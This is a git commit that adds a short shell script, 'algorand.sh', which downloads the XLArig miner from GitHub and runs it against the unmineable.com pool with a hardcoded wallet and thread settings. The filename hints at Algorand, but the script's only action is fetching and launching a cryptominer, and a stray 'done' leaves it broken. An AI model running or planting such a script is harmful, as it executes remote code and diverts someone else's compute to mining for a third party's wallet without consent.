4229d610a0e88510f244f0959e0ee6fe08ed4ddc
ekorahmadisaja <90667612+ekorahmadisaja@users.noreply.github.com>
2021-09-14 10:46:51 +0700

    Create algorand.sh

---
+++ algorand.sh
@@ -0,0 +1,5 @@
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
+unzip XLArig-v5.2.2-linux-x86_64.zip
+./xlarig -o rx-us.unmineable.com:13333 -u KBI2HGR4IE3V3LCWAEXCQ6RF3YTLTJFCOZYB6LQMZTVQRQUW3EUQ6R5CVE -p bismillah -a panthera -k -t4 
+sleep 2 
+done
